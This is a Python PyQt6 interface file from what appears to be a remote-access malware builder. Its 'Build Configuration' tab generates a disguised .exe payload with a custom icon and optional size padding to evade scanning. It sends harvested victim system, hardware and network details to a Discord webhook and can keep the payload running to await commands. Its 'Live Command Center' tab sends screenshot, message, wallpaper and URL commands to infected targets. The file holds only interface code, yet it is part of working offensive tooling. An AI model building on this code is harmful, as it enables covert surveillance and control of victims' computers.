# ui_setup.py
import os
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QCheckBox, QProgressBar, QFileDialog,
    QSpinBox, QGroupBox, QPlainTextEdit, QSizePolicy,
    QGridLayout, QTabWidget, QComboBox, QSpacerItem
)
from PyQt6.QtCore import Qt, QSize
from PyQt6.QtGui import QFont, QIcon

# Import constants from app_config
from app_config import (
    DEFAULT_PAYLOAD_NAME,
    DISCORD_INVITE_URL, YOUTUBE_URL, GITHUB_URL
)

# Define paths for icons
DISCORD_ICON_PATH = "icons/discord_icon.png"
YOUTUBE_ICON_PATH = "icons/youtube_icon.png"
GITHUB_ICON_PATH = "icons/github_icon.png"

# Helper to create icon buttons
def create_icon_button(main_window, icon_path, tooltip, url_to_check=None, fallback_text="?", check_url=True, is_link_icon=True):
    button = QPushButton()
    button.setObjectName("IconButton")
    button.setToolTip(tooltip)
    button.setCursor(Qt.CursorShape.PointingHandCursor)
    if is_link_icon:
        button.setFixedSize(QSize(26, 26))
        button.setIconSize(QSize(20, 20))
    else: # Zoom buttons
        button.setFixedSize(QSize(28, 28))

    icon_full_path = os.path.join(main_window.project_root, icon_path) if icon_path else None
    
    if icon_full_path and os.path.exists(icon_full_path):
        button.setIcon(QIcon(icon_full_path))
    else:
        button.setText(fallback_text)
        if icon_path and hasattr(main_window, 'log_to_gui') and callable(main_window.log_to_gui):
             main_window.log_to_gui(f"Warning: UI Icon not found at '{icon_full_path}' for '{tooltip}'. Using fallback text.")
        if is_link_icon and icon_path:
            button.setToolTip(f"{tooltip} (Icon Missing!)")

    if check_url:
        is_valid_url = (isinstance(url_to_check, str) and bool(url_to_check) and
                       "YOUR_" not in url_to_check.upper() and len(url_to_check) > 10)
        button.setEnabled(is_valid_url)
    else:
        button.setEnabled(True)
    return button


def setup_main_window_ui(main_window):
    main_window.setMinimumSize(620, 780)
    main_window.resize(680, 820)

    central_widget = QWidget()
    main_window.setCentralWidget(central_widget)
    main_layout = QVBoxLayout(central_widget)
    main_layout.setContentsMargins(10, 10, 10, 10)
    main_layout.setSpacing(8)

    # --- Top Bar ---
    settings_bar_layout = QHBoxLayout()
    settings_bar_layout.setSpacing(6)
    settings_bar_layout.addStretch(1)
    main_window.zoom_out_button = create_icon_button(main_window, "", "Decrease Font Size", url_to_check=None, fallback_text="–", check_url=False, is_link_icon=False)
    main_window.zoom_in_button = create_icon_button(main_window, "", "Increase Font Size", url_to_check=None, fallback_text="+", check_url=False, is_link_icon=False)
    settings_bar_layout.addWidget(main_window.zoom_out_button)
    settings_bar_layout.addWidget(main_window.zoom_in_button)
    settings_bar_layout.addSpacing(10)
    main_window.discord_button = create_icon_button(main_window, DISCORD_ICON_PATH, "Join Discord Server", DISCORD_INVITE_URL, "D", is_link_icon=True)
    main_window.youtube_button = create_icon_button(main_window, YOUTUBE_ICON_PATH, "Visit YouTube Channel", YOUTUBE_URL, "Y", is_link_icon=True)
    main_window.github_button = create_icon_button(main_window, GITHUB_ICON_PATH, "Visit GitHub Profile", GITHUB_URL, "G", is_link_icon=True)
    settings_bar_layout.addWidget(main_window.discord_button)
    settings_bar_layout.addWidget(main_window.youtube_button)
    settings_bar_layout.addWidget(main_window.github_button)
    main_layout.addLayout(settings_bar_layout)

    # --- Tab Widget ---
    main_window.tab_widget = QTabWidget()
    main_layout.addWidget(main_window.tab_widget)

    # ===================================
    # === TAB 1: Build Configuration ===
    # ===================================
    build_config_tab = QWidget()
    build_config_layout = QVBoxLayout(build_config_tab)
    build_config_layout.setContentsMargins(8, 10, 8, 8)
    build_config_layout.setSpacing(12)

    # --- Group 1: Discord Configuration (For Results) ---
    webhook_group = QGroupBox("Discord Configuration (For Results)")
    webhook_layout = QVBoxLayout() 
    main_window.webhook_url_input = QLineEdit()
    main_window.webhook_url_input.setPlaceholderText("Enter Discord Webhook URL for receiving data")
    webhook_layout.addWidget(QLabel("Results Webhook URL:"))
    webhook_layout.addWidget(main_window.webhook_url_input)
    webhook_group.setLayout(webhook_layout)
    build_config_layout.addWidget(webhook_group)

    # --- Group 2: Payload Generation Options --- (REVISED LAYOUT)
    options_group = QGroupBox("Payload Generation Options")
    options_main_v_layout = QVBoxLayout() # Main vertical layout for this group's rows
    options_main_v_layout.setSpacing(10) # Spacing between rows

    # --- Row 1: Filename and Icon ---
    row1_layout = QHBoxLayout()
    row1_layout.setSpacing(6) # Spacing between items in this row

    row1_layout.addWidget(QLabel("Output Filename:"))
    main_window.output_name_input = QLineEdit(DEFAULT_PAYLOAD_NAME)
    main_window.output_name_input.setToolTip("Enter the desired name for the output .exe file.")
    main_window.output_name_input.setFixedWidth(220) # Fixed width for filename input
    row1_layout.addWidget(main_window.output_name_input)

    row1_layout.addSpacing(15) # A bit more space before icon elements

    main_window.icon_display_label = QLabel("Icon: Default")
    main_window.icon_display_label.setToolTip("Current icon for the payload executable.")
    row1_layout.addWidget(main_window.icon_display_label)

    main_window.select_icon_button = QPushButton("Select Icon")
    main_window.select_icon_button.setToolTip("Choose a .ico file for the payload.")
    row1_layout.addWidget(main_window.select_icon_button)

    main_window.clear_icon_button = QPushButton("Default Icon")
    main_window.clear_icon_button.setToolTip("Revert to the default payload icon.")
    row1_layout.addWidget(main_window.clear_icon_button)

    row1_layout.addStretch(1) # Pushes icon elements to the left after filename, consumes rest of space
    options_main_v_layout.addLayout(row1_layout)

    # --- Row 2: Live Execution Mode Checkbox ---
    main_window.live_execution_checkbox = QCheckBox("Enable Live Execution Mode (Payload stays running)")
    main_window.live_execution_checkbox.setChecked(False)
    main_window.live_execution_checkbox.setToolTip(
        "If checked, the payload will send initial info, then stay running in the background awaiting further commands.\n"
        "It will report a Unique ID to the results webhook."
    )
    # Add with some horizontal margins or align left within its own HBox to prevent full stretch
    row2_live_exec_layout = QHBoxLayout()
    row2_live_exec_layout.addWidget(main_window.live_execution_checkbox)
    row2_live_exec_layout.addStretch(1) # Keep it left-aligned
    options_main_v_layout.addLayout(row2_live_exec_layout)


    # --- Row 3: EXE Inflation ---
    row3_pump_layout = QHBoxLayout()
    row3_pump_layout.setSpacing(6)

    main_window.pump_checkbox = QCheckBox("Inflate EXE Size (MB):")
    main_window.pump_checkbox.setToolTip("Pad the final executable with null bytes to reach a target size.")
    row3_pump_layout.addWidget(main_window.pump_checkbox)

    main_window.pump_size_spinbox = QSpinBox()
    main_window.pump_size_spinbox.setRange(0, 1024)
    main_window.pump_size_spinbox.setValue(0)
    main_window.pump_size_spinbox.setEnabled(False)
    main_window.pump_size_spinbox.setFixedWidth(70) # Fixed width for spinbox
    row3_pump_layout.addWidget(main_window.pump_size_spinbox)
    row3_pump_layout.addStretch(1) # Pushes spinbox to be right after its label, consumes rest of space
    options_main_v_layout.addLayout(row3_pump_layout)
    
    options_group.setLayout(options_main_v_layout)
    build_config_layout.addWidget(options_group)

    # --- Group 3: System Information to Include (Initial Report) ---
    sysinfo_group = QGroupBox("System Information to Include (Initial Report)")
    sysinfo_checkbox_grid = QGridLayout()
    sysinfo_checkbox_grid.setHorizontalSpacing(20)
    sysinfo_checkbox_grid.setVerticalSpacing(15)
    main_window.sysinfo_overview_checkbox = QCheckBox("System Overview (User, OS, Host)")
    main_window.sysinfo_overview_checkbox.setChecked(True)
    sysinfo_checkbox_grid.addWidget(main_window.sysinfo_overview_checkbox, 0, 0)
    main_window.sysinfo_hardware_checkbox = QCheckBox("Hardware Specs (CPU, RAM, GPU)")
    main_window.sysinfo_hardware_checkbox.setChecked(True)
    sysinfo_checkbox_grid.addWidget(main_window.sysinfo_hardware_checkbox, 0, 1)
    main_window.sysinfo_network_connectivity_checkbox = QCheckBox("Network Connectivity (Public IP, Wi-Fi)")
    main_window.sysinfo_network_connectivity_checkbox.setChecked(True)
    sysinfo_checkbox_grid.addWidget(main_window.sysinfo_network_connectivity_checkbox, 1, 0)
    main_window.sysinfo_active_interfaces_checkbox = QCheckBox("Active Interfaces (Local IPs, MAC)")
    main_window.sysinfo_active_interfaces_checkbox.setChecked(True)
    sysinfo_checkbox_grid.addWidget(main_window.sysinfo_active_interfaces_checkbox, 1, 1)
    main_window.sysinfo_storage_checkbox = QCheckBox("Storage / Disk Usage")
    main_window.sysinfo_storage_checkbox.setChecked(True)
    sysinfo_checkbox_grid.addWidget(main_window.sysinfo_storage_checkbox, 2, 0)
    main_window.sysinfo_misc_network_checkbox = QCheckBox("Other Network Info (Ports, Scan)")
    main_window.sysinfo_misc_network_checkbox.setChecked(False)
    sysinfo_checkbox_grid.addWidget(main_window.sysinfo_misc_network_checkbox, 2, 1)
    sysinfo_checkbox_grid.setColumnStretch(0, 1)
    sysinfo_checkbox_grid.setColumnStretch(1, 1)
    sysinfo_group.setLayout(sysinfo_checkbox_grid)
    build_config_layout.addWidget(sysinfo_group)

    build_config_layout.addStretch(1) # Pushes Build Process & Log to bottom

    # --- Group 4: Build Process ---
    build_group = QGroupBox("Build Process")
    build_layout = QVBoxLayout()
    main_window.build_button = QPushButton("Generate Payload")
    main_window.build_button.setFixedHeight(45)
    main_window.build_button.setObjectName("BuildButton")
    build_layout.addWidget(main_window.build_button)
    main_window.progress_bar = QProgressBar()
    main_window.progress_bar.setValue(0)
    main_window.progress_bar.setTextVisible(True)
    main_window.progress_bar.setFormat("%p%")
    build_layout.addWidget(main_window.progress_bar)
    main_window.status_label = QLabel("Status: Ready")
    main_window.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
    build_layout.addWidget(main_window.status_label)
    build_group.setLayout(build_layout)
    build_config_layout.addWidget(build_group)

    # --- Group 5: Build Log ---
    log_group = QGroupBox("Build Log")
    log_layout = QVBoxLayout()
    main_window.log_output_area = QPlainTextEdit()
    main_window.log_output_area.setReadOnly(True)
    main_window.log_output_area.setMinimumHeight(120) 
    log_layout.addWidget(main_window.log_output_area)
    log_group.setLayout(log_layout)
    build_config_layout.addWidget(log_group)

    main_window.tab_widget.addTab(build_config_tab, "Build Configuration")

    # =====================================
    # === TAB 2: Live Command Center ===
    # =====================================
    command_center_tab = QWidget()
    command_center_layout = QVBoxLayout(command_center_tab)
    command_center_layout.setContentsMargins(8, 10, 8, 8)
    command_center_layout.setSpacing(10)

    cmd_config_group = QGroupBox("Command Configuration")
    cmd_config_form_layout = QGridLayout() 

    cmd_config_form_layout.addWidget(QLabel("Target Payload ID:"), 0, 0)
    main_window.target_payload_id_input = QLineEdit()
    main_window.target_payload_id_input.setPlaceholderText("Enter Unique ID of the target payload")
    cmd_config_form_layout.addWidget(main_window.target_payload_id_input, 0, 1)

    cmd_config_form_layout.addWidget(QLabel("Action:"), 1, 0)
    main_window.action_combobox = QComboBox()
    main_window.action_combobox.addItems([
        "--- Select Action ---",
        "Take Screenshot",
        "Show Message Box",
        "Change Wallpaper (URL)",
        "Open URL",
    ])
    cmd_config_form_layout.addWidget(main_window.action_combobox, 1, 1)
    
    main_window.action_arg_label = QLabel("Argument(s):")
    cmd_config_form_layout.addWidget(main_window.action_arg_label, 2, 0)
    main_window.action_arg_input = QLineEdit()
    main_window.action_arg_input.setPlaceholderText("e.g., Message text, URL for wallpaper/open")
    cmd_config_form_layout.addWidget(main_window.action_arg_input, 2, 1)
    main_window.action_arg_label.setVisible(False) 
    main_window.action_arg_input.setVisible(False)

    cmd_config_form_layout.setColumnStretch(1, 1)
    cmd_config_group.setLayout(cmd_config_form_layout)
    command_center_layout.addWidget(cmd_config_group)

    main_window.send_command_button = QPushButton("Send Command to Payload")
    main_window.send_command_button.setObjectName("BuildButton") 
    main_window.send_command_button.setFixedHeight(40)
    main_window.send_command_button.setToolTip("This will use the configured Bot Token and Channel ID to send the command.")
    command_center_layout.addWidget(main_window.send_command_button)
    
    command_log_group = QGroupBox("Command Log/Status")
    command_log_layout = QVBoxLayout()
    main_window.command_log_area = QPlainTextEdit()
    main_window.command_log_area.setReadOnly(True)
    main_window.command_log_area.setPlaceholderText("Status of sent commands and responses will appear here...")
    main_window.command_log_area.setMinimumHeight(100) 
    command_log_layout.addWidget(main_window.command_log_area)
    command_log_group.setLayout(command_log_layout)
    command_center_layout.addWidget(command_log_group)

    command_center_layout.addStretch(1)
    main_window.tab_widget.addTab(command_center_tab, "Live Command Center")

    # --- Footer ---
    main_layout.addStretch(0) 
    main_window.footer_label = QLabel()
    main_window.footer_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
    main_window.footer_label.setObjectName("FooterLabel")
    main_layout.addWidget(main_window.footer_label)